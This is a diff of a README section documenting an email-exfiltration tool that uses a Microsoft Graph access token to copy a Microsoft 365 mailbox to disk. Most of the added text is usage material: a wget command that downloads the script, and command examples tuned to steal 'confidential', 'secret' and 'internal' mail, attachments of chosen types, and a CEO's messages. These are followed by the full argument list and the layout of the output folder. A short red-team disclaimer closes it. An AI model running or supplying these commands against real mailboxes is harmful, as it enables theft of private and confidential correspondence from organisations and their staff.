@@ -39,33 +39,137 @@ The script defaults to Microsoft Graph API but can be modified to target other M
 
 ## Microsoft Graph Email Exfiltrator
 
-A Python script that leverages Microsoft Graph API access tokens to retrieve and save emails from Exchange Online/Microsoft 365 mailboxes. The script demonstrates automated email content extraction using the Microsoft Graph API endpoints.
+A Python script that leverages Microsoft Graph API access tokens to retrieve and save emails from Exchange Online/Microsoft 365 mailboxes. The script provides flexible email extraction capabilities with advanced filtering options for precise targeting.
 
-## Features
-- Authenticates using Microsoft Graph API access tokens
-- Retrieves email messages from the authenticated user's mailbox
-- Extracts email subjects and full message bodies
-- Automatically detects and handles HTML-formatted emails
-- Saves email content to local files for offline analysis
-- Uses Microsoft Graph v1.0 API for stable operation
+### Features
+- Automated email content extraction using Microsoft Graph API
+- Complete mailbox access with token authentication
+- Saves email bodies, attachments, and metadata
+- Organized directory structure for extracted data
+- Advanced filtering capabilities:
+  - Content-based search
+  - Date ranges
+  - Sender/recipient filtering
+  - Importance levels
+  - Attachment presence and types
+  - Size-based filtering
+  - Term exclusion
+- Handles rate limiting and pagination
+- Proper error handling and recovery
 
-## Technical Details
-- Utilizes the `/me/messages` Graph API endpoint
-- Filters response to include subject and body content
-- Handles HTML content type detection and preservation
-- Implements proper error handling for API responses
-- Maintains original HTML formatting for rendered viewing
+### Requirements
+- Python 3.x
+- Required packages:
+  ```
+  requests
+  ```
 
-## Dependencies
-- requests
-- json
-- base64
+### Installation
+```bash
+wget https://raw.githubusercontent.com/0xG00S3/Azure/refs/heads/main/exfil_exchange_email.py
+```
 
-## Usage
-1. Insert a valid Microsoft Graph API access token
-2. Run the script to begin email extraction
-3. HTML emails are saved with their subjects as filenames
+### Usage
+
+#### Basic Usage
+Pull all emails from inbox:
+```bash
+python3 exfil_exchange_email.py --token "your_graph_api_token"
+```
+
+#### Advanced Filtering Examples
+
+1. Search for sensitive documents:
+```bash
+python3 exfil_exchange_email.py --token "your_token" \
+--query "confidential,secret,internal" \
+--has-attachments \
+--importance "high"
+```
+
+2. Target date ranges with specific attachment types:
+```bash
+python3 exfil_exchange_email.py --token "your_token" \
+--start-date "2024-01-01" \
+--end-date "2024-03-01" \
+--attachment-types ".pdf,.docx" \
+--min-size 1000000
+```
+
+3. Filter by sender and exclude terms:
+```bash
+python3 exfil_exchange_email.py --token "your_token" \
+--from-address "ceo@company.com" \
+--exclude-terms "newsletter,automated" \
+--max-emails 100
+```
+
+#### Available Arguments
+```bash
+--token Required. Microsoft Graph API token
+--output Output directory (default: exfiltrated_emails)
+--query Search terms (comma-separated)
+--max-emails Maximum number of emails to retrieve
+--folder Mailbox folder to search (default: inbox)
+--start-date Start date (YYYY-MM-DD)
+--end-date End date (YYYY-MM-DD)
+--from-address Filter by sender email
+--to-address Filter by recipient email
+--importance Filter by importance (high/normal/low)
+--has-attachments Filter for emails with attachments
+--attachment-types Attachment extensions to filter (e.g., .pdf,.docx)
+--exclude-terms Terms to exclude (comma-separated)
+--min-size Minimum email size in bytes
+--max-size Maximum email size in bytes
+```
+
+#### Output Structure
+```bash
+exfiltrated_emails/
+├── YYYYMMDD_HHMMSS_EmailSubject1/
+│ ├── body.html
+│ ├── metadata.json
+│ └── attachments/
+│ ├── document1.pdf
+│ └── document2.docx
+├── YYYYMMDD_HHMMSS_EmailSubject2/
+│ ├── body.txt
+│ └── metadata.json
+```
+
+#### Notes
+- Requires a valid Microsoft Graph API token with Mail.Read permissions
+- Rate limiting is handled automatically with exponential backoff
+- Attachments are saved in their original format
+- HTML emails preserve their formatting
+- All metadata is saved in JSON format for easy parsing
+
+#### Disclaimer
+This tool is intended for authorized security testing and red team operations only. Ensure you have proper authorization before using this tool against any target systems.
+
 
 ---
 
 Everything in this repository is to be used for educational purposes only.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
